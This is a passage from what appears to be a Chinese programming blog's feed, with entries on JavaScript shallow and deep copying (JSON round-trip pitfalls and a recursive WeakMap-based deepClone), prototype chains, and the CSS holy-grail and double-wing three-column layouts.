class="token function">copy</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//20  </span></code></pre><h2 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h2><blockquote><p>深拷贝复制变量值，对于非基本类型的变量，则递归至基本类型变量后，再复制。深拷贝后的对象与原来的对象是完全隔离的，互不影响，对一个对象的修改并不会影响另一个对象。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span><span class="token string">'a'</span><span class="token punctuation">,</span>    hobbies<span class="token punctuation">:</span><span class="token punctuation">{</span>        like<span class="token punctuation">:</span><span class="token string">'coding'</span><span class="token punctuation">,</span>        hate<span class="token punctuation">:</span><span class="token string">'reading'</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>     <span class="token keyword">let</span> obj2 <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>obj<span class="token punctuation">)</span><span class="token keyword">let</span> obj3 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>hobbies<span class="token punctuation">.</span>like <span class="token operator">=</span> <span class="token string">'reading'</span>obj<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'b'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//name:a,like:reading,说明没有实现深拷贝</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//实现了深拷贝，但是存在问题</span><span class="token comment" spellcheck="true">// //JSON.parse(JSON.stringify(obj))我们一般用来深拷贝，其过程说白了 就是利用JSON.stringify 将js对象序列化（JSON字符串），再使用JSON.parse来反序列化(还原)js对象</span></code></pre><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign" target="_blank" rel="noopener">Object.assign</a></p></li><li><p><a href="https://jinjingxuan.github.io/2020/04/12/JavaScript-JSON.stringify%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">JSON.stringify详解</a></p></li></ul><blockquote><p>JSON.parse(JSON.stringify(obj)) 的问题：</p><ol><li>如果obj里面有时间对象，则JSON.stringify后再JSON.parse的结果，时间将只是字符串的形式。而不是时间对象；</li><li>如果obj里有RegExp、Error对象，则序列化的结果将只得到空对象；</li><li>如果obj里有函数，undefined，symbol，则序列化的结果会把函数或 undefined丢失；</li><li>如果obj里有NaN、Infinity和-Infinity，则序列化的结果会变成null</li><li>JSON.stringify()只能序列化对象的可枚举的自有属性，例如 如果obj中的对象是有构造函数生成的， 则使用JSON.parse(JSON.stringify(obj))深拷贝后，会丢弃对象的constructor；</li><li>如果对象中存在循环引用的情况也无法正确实现深拷贝；因为JSON.tostringify 无法将一个无限引用的对象序列化为 JSON 字符串。</li></ol></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'date'</span><span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'regexp'</span><span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token regex">/a/</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'err'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'fun'</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">'undefined'</span><span class="token punctuation">:</span> undefined<span class="token punctuation">,</span>    <span class="token string">'symbol'</span><span class="token punctuation">:</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'nan'</span><span class="token punctuation">:</span> <span class="token number">NaN</span><span class="token punctuation">,</span>    <span class="token string">'str'</span><span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'object'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> _obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>object<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**    date: Wed Feb 03 2021 10:37:06 GMT+0800 (中国标准时间) {}    error: Error: err at &lt;anonymous>:4:14  fun: ƒ a()  nan: NaN  object: {a: 2}  regexp: /a/  str: String {"a"}  symbol: Symbol(1)  undefined: undefined*/</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_obj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**    date: "2021-02-03T02:37:06.906Z"    error: {}  nan: null  object: {a: 1}  regexp: {}  str: "a"*/</span><span class="token comment" spellcheck="true">// 循环引用</span><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    b<span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span>o<span class="token punctuation">,</span>    d<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span>o<span class="token punctuation">.</span>e <span class="token operator">=</span> a <span class="token comment" spellcheck="true">//创建循环引用</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//报错</span></code></pre><h3 id="递归方法实现深拷贝原理："><a href="#递归方法实现深拷贝原理：" class="headerlink" title="递归方法实现深拷贝原理："></a>递归方法实现深拷贝原理：</h3><p>遍历对象、数组直到里边都是基本数据类型，然后再去复制，就是深度拷贝。</p><blockquote><p>有种特殊情况需注意就是对象存在循环引用的情况，即对象的属性直接的引用了自身的情况，解决循环引用问题，我们可以额外开辟一个存储空间，来存储当前对象和拷贝对象的对应关系，当需要拷贝当前对象时，先去存储空间中找，有没有拷贝过这个对象，如果有的话直接返回，如果没有的话继续拷贝，这样就巧妙化解的循环引用的问题。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> hash <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 如果是null或者undefined我就不进行拷贝操作</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> obj<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 处理 Date, RegExp, Error 对象</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Date</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">RegExp</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Error</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 如果是 function, undefined, symbol, NaN 等不是对象的话是不需要深拷贝</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">!==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 是对象的话就要进行深拷贝</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hash<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> hash<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 保留 constructor</span>    <span class="token keyword">let</span> cloneObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">obj<span class="token punctuation">.</span>constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hash<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> cloneObj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 实现一个递归拷贝</span>            cloneObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> cloneObj<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> deepobj <span class="token operator">=</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>deepobj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**    date: Wed Feb 03 2021 11:02:25 GMT+0800 (中国标准时间) {}  error: Error at deepClone (&lt;anonymous>:10:20) at deepClone (&lt;anonymous>:16:29) at &lt;anonymous>:35:15  fun: ƒ a()  nan: NaN  object: {a: 1}  regexp: /a/  str: String {"", 0: "a"}  symbol: Symbol(1)  undefined: undefined  __proto__: Object*/</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> address<span class="token punctuation">:</span> <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">100</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>o <span class="token operator">=</span> obj<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 对象存在循环引用的情况</span><span class="token keyword">let</span> d <span class="token operator">=</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>address<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// { name: 1, address: { x: 100 } }</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原型和原型链</title>
      <link href="2018/09/19/JavaScript-%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
      <url>2018/09/19/JavaScript-%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<ul><li>原型：<a href="https://blog.csdn.net/u012468376/article/details/53121081" target="_blank" rel="noopener">https://blog.csdn.net/u012468376/article/details/53121081</a> </li><li>原型链：<a href="https://blog.csdn.net/u012468376/article/details/53127929" target="_blank" rel="noopener">https://blog.csdn.net/u012468376/article/details/53127929</a></li><li><a href="https://pic2.zhimg.com/80/dcd9f21f6457d284950b767e6f7bdea3_720w.jpg?source=1940ef5c" target="_blank" rel="noopener">Object和Function图示</a></li></ul><pre class=" language-js"><code class="language-js">Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 记住 new 返回的是对象</span>a<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// not a function</span>a<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2</span><span class="token keyword">let</span> fun <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>fun<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//1</span>fun<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//2</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>圣杯布局和双飞翼布局</title>
      <link href="2018/09/18/CSS-%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/"/>
      <url>2018/09/18/CSS-%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>圣杯布局跟双飞翼布局的实现，目的都是左右两栏固定宽度，中间部分自适应。<br>中间栏放在最前面优先渲染。 </p><h2 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h2><h3 id="1-这是初始状态，我们来构造圣杯布局"><a href="#1-这是初始状态，我们来构造圣杯布局" class="headerlink" title="1.这是初始状态，我们来构造圣杯布局"></a>1.这是初始状态，我们来构造圣杯布局</h3><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.header</span> </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>            <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">100</span>px<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*左右各留出100px*/</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.footer</span> </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.middle</span> </span><span class="token punctuation">{</span>                    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.left</span> </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.right</span> </span><span class="token punctuation">{</span>                    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> pink        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>middle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><h3 id="2-我们首先给middle-left-right三个盒子加上浮动"><a href="#2-我们首先给middle-left-right三个盒子加上浮动" class="headerlink" title="2.我们首先给middle,left,right三个盒子加上浮动"></a>2.我们首先给middle,left,right三个盒子加上浮动</h3><p><code>float:left</code></p><p>出现了高度塌陷给content加上<code>overflow:hidden</code></p><h3 id="3-这里先介绍一下margin-left"><a href="#3-这里先介绍一下margin-left" class="headerlink" title="3.这里先介绍一下margin-left"></a>3.这里先介绍一下margin-left</h3><p>当margin-left的值为%时，数值基于父对象的百分比左外边距。  </p><p>给黄色盒子加上<code>margin-left:-100%</code></p><p>给粉色盒子加上<code>margin-left:-100px</code>  </p><h3 id="3-最后用相对定位调整位置"><a href="#3-最后用相对定位调整位置" class="headerlink" title="3.最后用相对定位调整位置"></a>3.最后用相对定位调整位置</h3><p>给黄色盒子加上<code>position:relative;right:100px</code></p><p>给粉色盒子加上<code>position:relative;left:100px</code></p><h2 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token class">.header</span> </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>            <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.footer</span> </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.middle</span> </span><span class="token punctuation">{</span>                        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token selector"><span class="token class">.inner-middle</span></span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span><span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.left</span> </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>            <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>            <span class="token property">margin-left</span><span class="token punctuation">:</span> -<span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> yellow<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector"><span class="token class">.right</span> </span><span class="token punctuation">{</span>                        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>            <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>            <span class="token property">margin-left</span><span class="token punctuation">:</span> -<span class="token number">100</span>px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> pink        <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>middle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner-middle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="1-初始状态"><a href="#1-初始状态" class="headerlink" title="1.初始状态"></a>1.初始状态</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>middle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner-middle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span 